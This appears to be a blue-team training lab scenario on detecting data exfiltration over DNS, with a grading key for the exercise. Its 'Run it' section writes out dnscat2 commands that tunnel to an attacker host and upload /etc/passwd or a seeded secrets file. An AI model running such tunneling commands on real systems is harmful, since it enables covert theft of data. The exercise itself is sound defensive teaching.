# S09 — Exfiltration over DNS

**Tier 3 · ATT&CK: T1048.003 (Exfil over Alt Protocol), T1071.004 (DNS)**

## Story
Data left `vic-lin`, but not over any obvious channel — it was smuggled out inside DNS queries. Prove exfil happened, estimate how much left, and identify the channel.

## Lab setup
- `vic-lin` (victim) + attacker running a DNS tunneling server (`dnscat2` or `iodine`) on `kali`, authoritative for a lab domain like `t.lab`.
- Capture: `tcpdump -i eth0 -w /cases/s09.pcap 'udp port 53'` on `vic-lin`, and enable DNS query logging if you run a resolver.

## Run it
```bash
# on kali (server)
dnscat2-server t.lab
# on vic-lin (client) - tunnel and push a file
dnscat2 --dns server=10.10.10.5,domain=t.lab
# inside the session: upload /etc/passwd or a seeded 'secrets.txt'
```
Randomize file size and query rate so "how much left" is a real estimate.

## Cleanup / revert
Kill the tunnel, revert to `baseline`. Keep the pcap — it's your evidence and a portfolio artifact.

## What telemetry this generates
- **pcap / DNS logs**: a flood of queries for long, high-entropy, base32/hex subdomains under `t.lab` (`a3f9c1...e2.t.lab`) — abnormal length, abnormal volume, one domain, TXT/NULL/CNAME record types.
- **Wazuh**: won't flag this out of the box — that's a deliberate lesson. You may see the process (`dnscat2`) via auditd, but the *channel* only shows in the pcap/DNS telemetry.

## Your investigation (fill cold)
What made these queries abnormal (length? entropy? volume? record type? single destination domain)? Estimate bytes exfiltrated from query count × payload-per-query. Which domain/server received it? Why did host-based alerting stay quiet — and what data source would you *need* to catch this? Decode a sample subdomain if you can.

## Detection engineering
A detection on DNS query length/entropy thresholds, or query volume to a single second-level domain over a window. This is where you learn Wazuh needs a DNS log source it doesn't have by default — writing that gap into the case (and adding the log source) is the real deliverable. Optionally a Sigma rule for DNS-tunneling patterns.

<details>
<summary>Grading key — do not open until your verdict is written</summary>

- Sealed truth: tool, domain, file exfiltrated, approximate byte count, query rate.
- **Good:** you characterize the tunnel from packet features (length + entropy + volume + record type), estimate volume with your arithmetic shown, name the destination, and correctly explain the host-based blind spot. Bonus: partial decode of a query payload.
- **Miss:** "lots of DNS queries" without the *why abnormal* — normal DNS is short, cached, and diverse; this is long, unique, and single-domain. That contrast is the finding.
</details>
